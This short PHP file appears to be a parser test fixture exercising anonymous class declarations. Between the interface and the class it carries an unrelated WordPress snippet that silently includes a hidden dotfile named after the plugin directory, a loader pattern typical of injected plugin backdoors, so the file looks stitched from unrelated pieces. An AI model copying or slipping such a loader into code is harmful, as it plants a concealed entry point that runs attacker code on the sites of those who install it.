<?php
interface foo {
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class class_with_method_that_declares_anonymous_class
{
    public function method()
    {
        $o = new class { public function foo() {} };
        $o = new class{public function foo(){}};
        $o = new class extends stdClass {};
        $o = new class extends stdClass {};
        $o = new class implements foo {};
    }
}
